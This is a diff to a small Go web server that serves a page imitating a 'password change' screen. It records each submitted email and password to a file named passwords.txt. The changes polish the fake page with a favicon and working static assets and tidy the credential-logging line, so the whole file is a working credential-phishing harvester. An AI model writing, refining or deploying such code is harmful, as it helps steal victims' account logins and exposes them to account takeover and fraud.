@@ -8,7 +8,7 @@ import (
 )
 
 const (
-	dataFile = "data.json"
+	dataFile = "passwords.txt"
 	urlPath  = "/password_and_security/password/change"
 )
 
@@ -17,15 +17,17 @@ func main() {
 		panic(fmt.Errorf("server address must be passed as an argument"))
 	}
 	addr := os.Args[1]
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		http.Redirect(w, r, urlPath, http.StatusTemporaryRedirect)
-	})
 	http.HandleFunc(urlPath, htmlHandler)
-	http.Handle("/static", http.FileServer(http.Dir("./static")))
-	http.HandleFunc("/send_passwd", passwordHandler)
+	http.HandleFunc("/favicon.ico", iconHandler)
+	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
+	http.HandleFunc("/send-passwd", passwordHandler)
 	if err := http.ListenAndServe(addr, nil); err != nil {
 		panic(err)
 	}
+}
+
+func iconHandler(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, "./static/image.png")
 }
 
 func htmlHandler(w http.ResponseWriter, r *http.Request) {
@@ -48,5 +50,5 @@ func passwordHandler(w http.ResponseWriter, r *http.Request) {
 			panic(err)
 		}
 	}()
-	f.WriteString(fmt.Sprintf("\nemail:%s password:%s\n", email, password))
+	fmt.Fprintf(f, "email:%s password:%s\n", email, password)
 }
